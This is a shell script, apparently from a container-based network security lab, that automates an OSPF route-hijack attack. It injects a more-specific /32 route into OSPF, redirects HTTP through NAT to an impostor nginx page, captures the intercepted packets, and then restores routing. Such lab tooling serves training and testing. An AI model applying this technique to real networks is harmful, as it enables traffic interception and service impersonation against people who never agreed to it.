#!/bin/sh

set -e

# ./ospf_route_hijack.sh clab-virtual-env-attacker
# ./ospf_route_hijack.sh clab-virtual-env-attacker 172.16.30.2/32 60

# If called with -n, return the menu name
if [ "$1" = "-n" ]; then
    echo "Route Hijack | OSPF + fake web server"
    exit 0
fi

# Ensure the name of the container is specified
if [ -z "$1" ]; then
    echo "Usage: $0 <attacker-container> [target-prefix] [restore-delay-seconds] [attacker-internal-ip]"
    exit 0
fi

ATTACKER_CONTAINER="$1"
TARGET_PREFIX="${2:-172.16.30.2/32}"
RESTORE_DELAY="${3:-60}"
KALI_IP="${4:-10.0.0.2}"
CAPTURE_FILE="/tmp/hijack_capture.pcap"

# Generate the attacker router container name from the attacker container name.
# Transformation: clab-<lab>-attacker -> clab-<lab>-router_attacker
LAB_PREFIX=$(echo "$ATTACKER_CONTAINER" | sed 's/-attacker$//')
ATTACKER_ROUTER_CONTAINER="${LAB_PREFIX}-router_attacker"

echo "================================"
echo "Attack: OSPF Route Hijack + Traffic Interception"
echo "Target prefix: $TARGET_PREFIX"
echo "Attacker IP: $KALI_IP"
echo "Restore after: ${RESTORE_DELAY}s"
echo "Attacker router: $ATTACKER_ROUTER_CONTAINER"
echo "Attacker node: $ATTACKER_CONTAINER"
echo "================================"

# Start packet capture on the attacker interface so all intercepted traffic is recorded to a file for later analysis
echo "--- Starting packet capture ---"
docker exec -d "$ATTACKER_CONTAINER" sh -c "
  tcpdump -i eth1 -w $CAPTURE_FILE 2>/dev/null
"

# Enable IP forwarding and configure NAT. The REDIRECT rule redirects HTTP to the attacker's own nginx,
# allowing traffic inspection and service impersonation
echo "--- Enabling forwarding + NAT ---"
docker exec "$ATTACKER_CONTAINER" sh -c "
  sysctl -w net.ipv4.ip_forward=1 >/dev/null
  iptables -t nat -F

  iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE
  iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 80
"

# Serve a malicious web page to impersonate the enterprise web server
echo "--- Starting malicious web server ---"
docker exec "$ATTACKER_CONTAINER" sh -c "
  echo 'Hello from the attacker :)' > /var/www/html/index.nginx-debian.html
  service nginx start
"

# --- Inject route (FIXED vtysh call) ---
# Inject a host route for the enterprise router public IP into the attacker's FRR node, then redistribute it into OSPF
# A /32 is more specific than the existing /30 subnet route, so all routers in the OSPF domain will prefer it and forward matching traffic to the attacker
echo "--- Injecting hijack route ---"
docker exec "$ATTACKER_ROUTER_CONTAINER" vtysh \
    -c "conf t" \
    -c "ip route $TARGET_PREFIX $KALI_IP" \
    -c "router ospf" \
    -c "redistribute static metric 1 metric-type 1" \
    -c "end"

echo "--- Attack running for ${RESTORE_DELAY}s ---"
sleep "$RESTORE_DELAY"

# Stop the packet capture before stopping the attack so that no packets are lost
echo "--- Stopping packet capture ---"
docker exec "$ATTACKER_CONTAINER" sh -c "pkill tcpdump || true"
sleep 1

# Remove the injected static route and remove the OSPF redistribution so the network returns back to its original state
echo "--- Restoring routing ---"
docker exec "$ATTACKER_ROUTER_CONTAINER" vtysh \
    -c "conf t" \
    -c "no ip route $TARGET_PREFIX $KALI_IP" \
    -c "router ospf" \
    -c "no redistribute static" \
    -c "end"

# Stop the malicious web server
echo "--- Stopping malicious web server ---"
docker exec "$ATTACKER_CONTAINER" sh -c "
  service nginx stop 2>/dev/null || true
"

echo "--- Attack completed ---"

# Remove the NAT rules
echo "--- Cleaning up NAT rules ---"
docker exec "$ATTACKER_CONTAINER" sh -c "
  iptables -t nat -F
"

# Show the last captured packages
echo ""
echo "--- Capture Summary ---"
docker exec "$ATTACKER_CONTAINER" sh -c "
  tcpdump -r $CAPTURE_FILE -n 2>/dev/null | tail -n 20 || echo '(no packets captured)'
"
